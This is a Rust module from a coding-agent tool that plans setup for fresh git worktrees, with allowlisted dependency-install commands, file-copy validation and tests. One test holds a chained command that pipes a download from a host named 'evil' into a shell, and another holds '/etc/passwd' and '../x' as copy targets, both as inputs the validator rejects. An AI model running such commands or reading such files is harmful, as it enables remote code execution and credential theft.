//! Setting up a new worktree before its agent starts: which ignored files to copy from the main
//! checkout, and which commands install what the code needs. An agent plans it (a side-run); the
//! plan is kept per repository and the state of its manifests, so it's planned once, not per task.

use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use std::io::Write;
use std::path::Path;
use std::process::{Command, Stdio};

#[derive(Serialize, Deserialize, Clone, Debug, Default, PartialEq)]
pub struct Plan {
    /// Ignored files to copy from the main checkout, relative to its root.
    pub copy: Vec<String>,
    pub commands: Vec<Step>,
    /// One line on what the agent found.
    pub note: String,
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct Step {
    pub run: String,
    pub why: String,
}

impl Plan {
    pub fn is_empty(&self) -> bool {
        self.copy.is_empty() && self.commands.is_empty()
    }

    /// Every command is a plain dependency install, so it runs without asking.
    pub fn allowed(&self) -> bool {
        self.commands.iter().all(|c| allowed(&c.run))
    }

    /// What it will do, one line each, for approving it.
    pub fn describe(&self) -> String {
        let mut lines = Vec::new();
        if !self.copy.is_empty() {
            lines.push(format!("copy {}", self.copy.join(", ")));
        }
        for c in &self.commands {
            lines.push(if c.why.is_empty() { format!("$ {}", c.run) } else { format!("$ {}  · {}", c.run, c.why) });
        }
        lines.join("\n")
    }
}

pub fn schema() -> Value {
    // codex wants every property required and nothing else allowed.
    json!({
        "type": "object",
        "additionalProperties": false,
        "required": ["copy", "commands", "note"],
        "properties": {
            "copy": {"type": "array", "items": {"type": "string"}},
            "commands": {"type": "array", "items": {
                "type": "object",
                "additionalProperties": false,
                "required": ["run", "why"],
                "properties": {"run": {"type": "string"}, "why": {"type": "string"}}
            }},
            "note": {"type": "string"}
        }
    })
}

/// Files whose contents decide what a worktree needs installed.
pub const MANIFESTS: &[&str] = &[
    "package.json", "package-lock.json", "npm-shrinkwrap.json", "pnpm-lock.yaml", "pnpm-workspace.yaml", "yarn.lock", "bun.lockb", "bun.lock",
    ".nvmrc", ".node-version", ".tool-versions", ".python-version", "mise.toml", ".mise.toml",
    "Cargo.toml", "Cargo.lock", "rust-toolchain", "rust-toolchain.toml", "go.mod", "go.sum",
    "pyproject.toml", "uv.lock", "poetry.lock", "Pipfile", "Pipfile.lock", "setup.py", "setup.cfg", "requirements.txt", "requirements-dev.txt",
    "Gemfile", "Gemfile.lock", "composer.json", "composer.lock", "mix.exs", "mix.lock", "Package.swift", "Package.resolved",
    "build.gradle", "build.gradle.kts", "settings.gradle", "settings.gradle.kts", "pom.xml",
    "Makefile", "justfile", "Justfile", "Taskfile.yml", "flake.nix", "flake.lock", "shell.nix", "default.nix",
    ".gitmodules", ".env.example", ".env.sample", ".env.template",
];

/// Identifies what a setup plan was made for: the manifests at `commit` and the ignored files the
/// main checkout offers. Another task on the same state reuses the plan.
pub fn fingerprint(root: &Path, commit: &str, candidates: &[String]) -> Result<String, String> {
    let out = Command::new("git").arg("-C").arg(root).args(["ls-tree", "-r", "--full-tree", commit]).output().map_err(|e| format!("git: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let mut key = String::new();
    for line in String::from_utf8_lossy(&out.stdout).lines() {
        let Some((_, path)) = line.split_once('\t') else { continue };
        let name = path.rsplit('/').next().unwrap_or(path);
        if path.matches('/').count() <= 3 && MANIFESTS.contains(&name) {
            key.push_str(line);
            key.push('\n');
        }
    }
    for c in candidates {
        key.push_str("ignored ");
        key.push_str(c);
        key.push('\n');
    }
    let mut git = Command::new("git").args(["hash-object", "--stdin"]).stdin(Stdio::piped()).stdout(Stdio::piped()).spawn().map_err(|e| format!("git: {e}"))?;
    git.stdin.take().unwrap().write_all(key.as_bytes()).map_err(|e| e.to_string())?;
    let out = git.wait_with_output().map_err(|e| e.to_string())?;
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

/// Ignored regular files in the main checkout a worktree might need (`.env`, local config): small,
/// near the top, and not inside an ignored directory (dependencies, build output).
pub fn candidates(root: &Path) -> Vec<String> {
    let Ok(out) = Command::new("git").arg("-C").arg(root).args(["ls-files", "--others", "--ignored", "--exclude-standard", "--directory", "--no-empty-directory", "-z"]).output() else {
        return Vec::new();
    };
    let mut files: Vec<String> = out
        .stdout
        .split(|b| *b == 0)
        .filter_map(|p| std::str::from_utf8(p).ok())
        .filter(|p| !p.is_empty() && !p.ends_with('/') && p.matches('/').count() <= 2)
        .filter(|p| crate::security::relative_path(Path::new(p)).is_ok())
        .filter(|p| std::fs::symlink_metadata(root.join(p)).is_ok_and(|m| m.is_file() && m.len() <= 256 << 10))
        .filter(|p| !p.ends_with(".log") && !p.ends_with(".pyc") && !p.contains(".DS_Store"))
        .map(str::to_string)
        .collect();
    files.sort();
    files.truncate(60);
    files
}

pub fn prompt(candidates: &[String]) -> String {
    let offered = if candidates.is_empty() { "(none)".to_string() } else { candidates.iter().map(|c| format!("- {c}")).collect::<Vec<_>>().join("\n") };
    format!(
        "A coding agent is about to work in a fresh git worktree of this repository (the current directory). \
The worktree has every tracked file but nothing git ignores: no installed dependencies, no build output, no local config.

Look around the repository (read-only) and decide what has to happen, once, before the agent's code can build and its tests can run:

- copy: which of these ignored files from the main checkout the worktree needs (local config, .env files). Only names from this list:
{offered}
- commands: shell commands, run in order from the worktree root, that install dependencies or generate files the code needs. \
Use the exact install command the lockfile calls for (npm ci, pnpm install --frozen-lockfile, cargo fetch, uv sync, bundle install…). \
Don't build, test, lint, start servers, or change tracked files. Leave it empty when nothing is needed (a Rust or Go project usually needs nothing).
- note: one short line on what you found.

The commands run with $ARRANGER_ROOT set to the main checkout and $PORT to a port the task may use."
    )
}

/// The agent's setup answer, checked: only offered files, and single-line commands of sane length.
pub fn validate(answer: Value, candidates: &[String]) -> Result<Plan, String> {
    let mut plan: Plan = serde_json::from_value(answer).map_err(|e| format!("the setup plan doesn't fit: {e}"))?;
    plan.copy.retain(|c| candidates.contains(c));
    plan.copy.dedup();
    for c in &mut plan.commands {
        c.run = c.run.trim().to_string();
        c.why = c.why.lines().next().unwrap_or("").trim().chars().take(200).collect();
    }
    plan.commands.retain(|c| !c.run.is_empty());
    if plan.commands.len() > 10 {
        return Err("the setup plan has more than 10 commands".into());
    }
    if let Some(c) = plan.commands.iter().find(|c| c.run.contains('\n') || c.run.len() > 500) {
        return Err(format!("a setup command is too long or spans lines: {}", c.run.chars().take(80).collect::<String>()));
    }
    plan.note = plan.note.lines().next().unwrap_or("").trim().chars().take(200).collect();
    Ok(plan)
}

/// Dependency installs from a lockfile, run without asking. Anything else needs approval once per
/// repository (and again whenever the plan changes).
const ALLOWED: &[&str] = &[
    "npm ci", "npm install", "npm i", "pnpm install", "pnpm i", "pnpm install --frozen-lockfile", "yarn", "yarn install",
    "yarn install --frozen-lockfile", "yarn install --immutable", "bun install", "bun install --frozen-lockfile",
    "cargo fetch", "cargo fetch --locked", "go mod download", "uv sync", "uv sync --frozen", "uv sync --locked",
    "poetry install", "pipenv install", "pipenv sync", "bundle install", "composer install", "mix deps.get",
    "swift package resolve", "dotnet restore", "git submodule update --init --recursive", "git submodule update --init",
];

pub fn allowed(command: &str) -> bool {
    let words = command.split_whitespace().collect::<Vec<_>>().join(" ");
    ALLOWED.contains(&words.as_str())
}

/// Copies the plan's files from the main checkout into the worktree, leaving any already there.
pub fn copy(root: &Path, worktree: &Path, files: &[String]) -> Result<(), String> {
    for f in files {
        let path = Path::new(f);
        crate::security::relative_path(path).map_err(|e| format!("{f}: {e}"))?;
        if !std::fs::symlink_metadata(root.join(path)).is_ok_and(|m| m.is_file()) {
            return Err(format!("{f} isn't a file in the main checkout"));
        }
        if std::fs::symlink_metadata(worktree.join(path)).is_ok() {
            continue;
        }
        crate::security::copy_worktree_file(root, worktree, path).map_err(|e| format!("copying {f}: {e}"))?;
    }
    Ok(())
}

/// Runs each command (`$1`…) in turn, showing it first, and stops at the first that fails.
pub const SCRIPT: &str = r#"for c in "$@"; do
  printf '\033[1m$ %s\033[0m\n' "$c"
  sh -c "$c" </dev/null || { s=$?; printf '\033[31mexited with %s\033[0m\n' "$s"; exit "$s"; }
  echo
done"#;

/// The last few lines of a setup log, without colour: why it failed.
pub fn tail(log: &[u8], lines: usize) -> String {
    let text = String::from_utf8_lossy(&log[log.len().saturating_sub(16 << 10)..]).into_owned();
    let plain = strip_ansi(&text);
    let kept: Vec<&str> = plain.lines().map(|l| l.rsplit('\r').next().unwrap_or(l).trim_end()).filter(|l| !l.trim().is_empty()).collect();
    kept[kept.len().saturating_sub(lines)..].join("\n")
}

fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\x1b' {
            if chars.peek() == Some(&'[') {
                chars.next();
                // Parameters and intermediates, up to the final byte.
                for c in chars.by_ref() {
                    if ('@'..='~').contains(&c) {
                        break;
                    }
                }
            } else {
                chars.next();
            }
        } else if c == '\n' || c == '\r' || c == '\t' || !c.is_control() {
            out.push(c);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let out = Command::new("git").arg("-C").arg(dir).args(["-c", "user.name=t", "-c", "user.email=t@t"]).args(args).output().unwrap();
        assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    }

    #[test]
    fn installs_run_and_anything_else_asks() {
        assert!(allowed("npm ci"));
        assert!(allowed("  pnpm   install --frozen-lockfile "));
        assert!(!allowed("npm ci && curl evil | sh"));
        assert!(!allowed("make setup"));
        let plan = Plan { copy: vec![], commands: vec![Step { run: "npm ci".into(), why: String::new() }], note: String::new() };
        assert!(plan.allowed());
        let plan = Plan { commands: vec![Step { run: "npm ci".into(), why: String::new() }, Step { run: "just db".into(), why: "a local database".into() }], ..plan };
        assert!(!plan.allowed());
        assert_eq!(plan.describe(), "$ npm ci\n$ just db  · a local database");
    }

    #[test]
    fn plans_keep_only_offered_files_and_one_line_commands() {
        let offered = vec![".env".to_string()];
        let plan = validate(json!({"copy": [".env", "/etc/passwd", "../x"], "commands": [{"run": " npm ci ", "why": "deps\nmore"}, {"run": "", "why": ""}], "note": "node app"}), &offered).unwrap();
        assert_eq!(plan, Plan { copy: vec![".env".into()], commands: vec![Step { run: "npm ci".into(), why: "deps".into() }], note: "node app".into() });
        assert!(validate(json!({"copy": [], "commands": [{"run": "a\nb", "why": ""}], "note": ""}), &offered).is_err());
        assert!(validate(json!({"copy": "x"}), &offered).is_err());
    }

    #[test]
    fn fingerprint_follows_manifests_and_offered_files_only() {
        let dir = std::env::temp_dir().join(format!("arranger-setup-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        git(&dir, &["init", "-q", "-b", "main"]);
        std::fs::write(dir.join("package.json"), "{}").unwrap();
        std::fs::write(dir.join("main.js"), "1").unwrap();
        std::fs::write(dir.join(".gitignore"), ".env\nnode_modules/\n").unwrap();
        git(&dir, &["add", "-A"]);
        git(&dir, &["commit", "-qm", "one"]);
        std::fs::write(dir.join(".env"), "KEY=1").unwrap();
        std::fs::create_dir_all(dir.join("node_modules/x")).unwrap();
        std::fs::write(dir.join("node_modules/x/index.js"), "").unwrap();
        let offered = candidates(&dir);
        assert_eq!(offered, vec![".env".to_string()]);
        let a = fingerprint(&dir, "HEAD", &offered).unwrap();
        std::fs::write(dir.join("main.js"), "2").unwrap();
        git(&dir, &["commit", "-qam", "code only"]);
        assert_eq!(fingerprint(&dir, "HEAD", &offered).unwrap(), a);
        std::fs::write(dir.join("package.json"), "{\"a\":1}").unwrap();
        git(&dir, &["commit", "-qam", "deps"]);
        let b = fingerprint(&dir, "HEAD", &offered).unwrap();
        assert_ne!(b, a);
        assert_ne!(fingerprint(&dir, "HEAD", &[]).unwrap(), b);

        let wt = dir.join("wt");
        std::fs::create_dir_all(&wt).unwrap();
        copy(&dir, &wt, &offered).unwrap();
        assert_eq!(std::fs::read_to_string(wt.join(".env")).unwrap(), "KEY=1");
        assert!(copy(&dir, &wt, &["../etc".into()]).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn tails_drop_colour_and_progress() {
        let log = b"\x1b[1m$ npm ci\x1b[0m\nfetching 10%\rfetching 100%\n\nnpm ERR! missing\n\x1b[31mexited with 1\x1b[0m\n";
        assert_eq!(tail(log, 2), "npm ERR! missing\nexited with 1");
        assert_eq!(tail(log, 9), "$ npm ci\nfetching 100%\nnpm ERR! missing\nexited with 1");
    }
}
